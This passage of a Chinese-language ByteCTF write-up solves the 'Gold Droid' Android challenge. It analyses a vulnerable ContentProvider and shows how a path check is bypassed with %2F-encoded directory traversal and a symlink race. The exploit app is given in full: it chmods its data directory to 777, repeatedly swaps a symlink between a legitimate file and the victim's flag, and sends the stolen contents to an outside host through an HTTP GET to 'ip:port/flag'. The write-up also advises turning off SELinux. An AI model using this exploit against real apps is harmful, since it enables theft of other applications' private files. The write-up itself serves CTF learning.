                fileOutputStream.write("I\'m in external\n".getBytes(StandardCharsets.UTF_8)); //写入
                fileOutputStream.close();
            }
            catch(IOException e) {
                e.printStackTrace();
            }
        }
    }
VulProvider好像存在漏洞的样子
## 3.VulProvider逆向
VulProvider使用了ContentProvider将应用程序的数据暴露给外界。
如何通过一套标准及统一的接口获取其他应用程序暴露的数据？Android提供了ContentResolver，外界的程序可以通过ContentResolver接口访问ContentProvider提供的数据。ContentResolver是通过URI来获取Provider所提供的数据
    package com.bytectf.golddroid;
    import android.content.ContentProvider;
    import android.content.ContentValues;
    import android.database.Cursor;
    import android.net.Uri;
    import android.os.ParcelFileDescriptor;
    import java.io.File;
    import java.io.FileNotFoundException;
    import java.io.IOException;
    public class VulProvider extends ContentProvider { //
        @Override  // android.content.ContentProvider
        public int delete(Uri uri, String selection, String[] selectionArgs) {
            return 0;
        }
        @Override  // android.content.ContentProvider
        public String getType(Uri uri) {
            return null;
        }
        @Override  // android.content.ContentProvider
        public Uri insert(Uri uri, ContentValues values) {
            return null;
        }
        @Override  // android.content.ContentProvider
        public boolean onCreate() {
            return false;
        }
        @Override  // android.content.ContentProvider
        public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
            File file0 = this.getContext().getExternalFilesDir("sandbox"); 
          // file0 = /sdcard/Android/data/com.bytectf.golddroid/files/sandbox/
            File file = new File(this.getContext().getExternalFilesDir("sandbox"), uri.getLastPathSegment()); //
            // file = /sdcard/Android/data/com.bytectf.golddroid/files/sandbox/uri.getLastPathSegment()
            try { 
                if(!file.getCanonicalPath().startsWith(file0.getCanonicalPath())) { //防止目录穿越,getCanonicalPath会将目录中存在./和../的路径全部转化成没有./和../的路径，下面例子
                  //Path: workspace/test/../../../.././test1.txt
                 //getAbsolutePath:/Users/eeee/Desktop/CTF/ByteCTF/Gold_Droid/workspace/test/../../../.././test1.txt
                 //getCanonicalPath: /Users/eeee/Desktop/CTF/test1.txt
                    throw new IllegalArgumentException();
                }
            }
            catch(IOException e) {
                e.printStackTrace();
            }
            return ParcelFileDescriptor.open(file, 0x10000000); //0x10000000代表只读
        }
        @Override  // android.content.ContentProvider
        public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
            return null;
        }
        @Override  // android.content.ContentProvider
        public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
            return 0;
        }
    }
    public static ParcelFileDescriptor open(File file, int mode) throws FileNotFoundException {
            final FileDescriptor fd = openInternal(file, mode);
            if (fd == null) return null;
            return new ParcelFileDescriptor(fd);
        }
    private static FileDescriptor openInternal(File file, int mode) throws FileNotFoundException {
            final int flags = FileUtils.translateModePfdToPosix(mode) | ifAtLeastQ(O_CLOEXEC);
            int realMode = S_IRWXU | S_IRWXG;
            if ((mode & MODE_WORLD_READABLE) != 0) realMode |= S_IROTH;
            if ((mode & MODE_WORLD_WRITEABLE) != 0) realMode |= S_IWOTH;
            final String path = file.getPath(); //重新获得了path，没有用getCanonicalPath过滤，这样就存在目录穿越
            try {
                return Os.open(path, flags, realMode); 
            } catch (ErrnoException e) {
                throw new FileNotFoundException(e.getMessage());
            }
        }
# *注意
如果是普通文件，file.getAbsolutePath()和file.getCanonicalPath()是一样
如果是link文件，file.getAbsolutePath()是链接文件的路径；file.getCanonicalPath是实际文件的路径（所指向的文件路径）。
记住一定要 **执行adb shell setenforce 0 暂时关闭 selinux 进行验证。** 不然会被坑惨，三天我才找到这个呜呜呜呜。
如果不关闭的话，file.getCanonicalPath是不会得到文件的软链接的路径，所以导致file.getCanonicalPath().startsWith(file0.getCanonicalPath())这个if判断过不去。。。。。
介绍：
我写了一个demo，大家可以试试看，挺好玩的
    package com.bytectf.test;
    import androidx.appcompat.app.AppCompatActivity;
    import java.io.File;
    import java.io.IOException;
    import android.net.Uri;
    import android.os.Bundle;
    public class MainActivity extends AppCompatActivity {
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
            File file0 = new File("/data/data/com.bytectf.pwngolddroid/","cache");            //取得相对路径
            System.out.println("file0 Path: " + file0.getPath());
            String path = "content://slipme/" + "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.bytectf.pwngolddroid%2Fsymlink";
            Uri uri = Uri.parse(path);
            System.out.println("uri.getLastPathSegment:"+uri.getLastPathSegment());   //利用"%2F"绕过getLastPathSegment，让其存在目录穿越
            File file = new File(this.getExternalFilesDir("sandbox"),"../../../../../../../../data/data/com.bytectf.pwngolddroid/symlink");
            File file1 = new File(this.getExternalFilesDir("sandbox"),uri.getLastPathSegment());
            File file2 = new File(this.getExternalFilesDir("sandbox"),"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.bytectf.pwngolddroid%2Fsymlink");
            System.out.println("file Path: " + file.getPath());
            System.out.println("file1 Path: " + file1.getPath());
            System.out.println("file2 Path: " + file2.getPath());
            try {
                System.out.println("file1.getCanonicalPath:"+file1.getCanonicalPath());
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                if(!file1.getCanonicalPath().startsWith(file0.getCanonicalPath())) {  /////////////
                    throw new IllegalArgumentException();
                }
            }
            catch(IOException e) {
                e.printStackTrace();
            }
            //取得绝对路径
    //        try{
    //            System.out.println("getCanonicalPath: "+ file.getCanonicalPath()); }
    //        catch(Exception e){}
        }
        }
用"%2F"绕过getLastPathSegment；
## 4.漏洞利用
那么我一开始想不到我们编写的apk如何与目标apk进行交流，如何启动目标apk的VulActivity，一方面需要请求受害者apk的VulProvider，另一方面需要进行线程竞争和软链接，当软链接合法的时候通过openFile的检测，进入ParcelFileDescriptor.open，这时如果凑巧非法链接到了flag文件，便可以得到flag了。
如果运行程序的话，可以观察到在手机里symlink文件的软链接一直在被切换，一是指向flag这个非法路径，二是指向sandbox/file1这个合法路径
由于我是用安卓机复现，所以让其指向了非法的flag文件和合法的/sandbox/file1便结束了(我不会说是我试了两天还没竞争出来)，
三天后，解决了这个问题，已破案。原因上面以说
MainActivity如下：
    package com.bytectf.pwngolddroid;
    import androidx.appcompat.app.AppCompatActivity;
    import android.content.ContentResolver;
    import android.net.Uri;
    import android.os.Bundle;
    import android.util.Log;
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStream;
    import java.net.HttpURLConnection;
    import java.net.URL;
    public class MainActivity extends AppCompatActivity {
        String symlink;
        public void httpGet(String msg) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    HttpURLConnection connection = null;
                    BufferedReader reader = null;
                    try {
                        Log.e("in_httpGet","inHttpGet1");
                        URL url = new URL("http://ip:port/flag?flag=" + msg); //这里可以写自己博客的ip和端口，对其进行访问，然后查看日志，我的日志在/var/log/nginx/access.log
                        Thread.sleep(1);
                        Log.e("in_httpGet","inHttpGet2");
                        connection = (HttpURLConnection) url.openConnection();
                        Thread.sleep(1);
                        Log.e("in_httpGet","inHttpGet3");
                        connection.setRequestMethod("GET");
                        Thread.sleep(1);
                        Log.e("in_httpGet","inHttpGet4");
                        connection.getInputStream();
                        Thread.sleep(1);
                        Log.e("httpget succeed","http_get succeed");
                    } catch (IOException | InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
        private String readUri(Uri uri) {
            InputStream inputStream = null;
            try {
                ContentResolver contentResolver = getContentResolver();
                inputStream = contentResolver.openInputStream(uri);
                if (inputStream != null) {
                    byte[] buffer = new byte[1024];
                    int result;
                    String content = "";
                    while ((result = inputStream.read(buffer)) != -1) {
                        content = content.concat(new String(buffer, 0, result));
                    }
                    return content;
                }
            } catch (IOException e) {
                Log.e("receiver", "IOException when reading uri", e);
            } catch (IllegalArgumentException e) {
                Log.e("receiver", "IllegalArgumentException", e);
            } finally {
                if (inputStream != null) {
                    try {
                        inputStream.close();
                    } catch (IOException e) {
                        Log.e("receiver", "IOException when closing stream", e);
                    }
                }
            }
            return null;
        }
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
            String root = getApplicationInfo().dataDir;
            symlink = root + "/symlink";
            try {
                Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
            String path = "content://slipme/" + "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F" + "data%2Fdata%2Fcom.bytectf.pwngolddroid%2Fsymlink";
            //String path = "content://slipme/sdcard/Android/data/com.bytectf.golddroid/files/sandbox/file1";
            new Thread(() -> {
                while (true) {
                    try {
                        Thread.sleep(1);
                        Runtime.getRuntime().exec("ln -sf /sdcard/Android/data/com.bytectf.golddroid/files/sandbox/file1 " + symlink).waitFor();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
            new Thread(() -> {
                while (true) {
                    try {
                        Thread.sleep(1);
                        Runtime.getRuntime().exec("ln -sf /data/data/com.bytectf.golddroid/files/flag " + symlink).waitFor();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
            new Thread(() -> {
                while (true) {
                    try {
                        Thread.sleep(10);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    String data = readUri(Uri.parse(path));
                    if(data.length()>0){
                        Log.e("has_data",data);
                        httpGet(data);
                    }
                }
            }).start();
        }
    }
本地拿到flag，也可以翻日志看
参考链接：  